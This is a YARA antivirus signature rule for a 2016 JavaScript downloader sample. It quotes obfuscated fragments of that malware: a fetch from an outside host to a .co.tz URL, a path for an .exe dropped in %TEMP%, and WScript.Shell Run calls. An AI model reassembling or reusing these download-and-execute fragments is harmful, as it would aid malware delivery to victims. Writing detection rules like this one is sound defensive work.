rule sig_20160329_4e27f16989af487220ab403ee7048ddd {
  meta:
    description = "datamaliciousorder - file 20160329_4e27f16989af487220ab403ee7048ddd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "546757d99755024257ac099ded09c14ddb4fcd080576121323cc5f3b9a61c22e"

  strings:
    $s1  = "function Agvjxzzoj() {return Oujmsr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"QOgNQezhM22R3tX.exe\";};" fullword ascii
    $s2  = "do {WScript[Roysbm](Eljbgublei() * 11)} while (Imyglwq[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Jtyszwssba(Qpefwzffi, Cgunxcv){return Qpefwzffi - Cgunxcv;};" fullword ascii
    $s4  = "var Oujmsr = function Sjrnpsu() {return WScript[Ruiee](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Imyglwq[Uichloo](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "function Poxmibed(Leajwn){Oujmsr[\"Run\"](Leajwn, Ouhpoe, Ouhpoe);};" fullword ascii
    $s7  = "function Cdsoyjmtiq() {return ((Xjpoxg == true) && (Xjpoxg == Reinuyt)) ? 1 : Ouhpoe;};" fullword ascii
    $s8  = "function Eljbgublei(){return 22;};" fullword ascii
    $s9  = "Xjpoxg = true; " fullword ascii
    $s10 = "var Reinuyt = false;" fullword ascii
    $s11 = "var Xjpoxg = false;" fullword ascii
    $s12 = "Reinuyt = true; " fullword ascii
    $s13 = "function Ejsckawtrm(){return Ruiee;};" fullword ascii
    $s14 = "return Jtyszwssba(Unbwa, Qkmkuferlu);" fullword ascii
    $s15 = "function Wfdqwez()" fullword ascii
    $s16 = "var Yjnlxw = new this[\"Date\"]();" fullword ascii
    $s17 = " while (Gmzyjti){" fullword ascii
    $s18 = "function Isgywglrwr(){return Ithtopn;};" fullword ascii
    $s19 = "var Wadas = false;" fullword ascii
    $s20 = "function Giwfjfbz(Etfrfybsi) {var Kkcrjdoa = (1, 2, 3, 4, 5, Etfrfybsi); return Kkcrjdoa;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}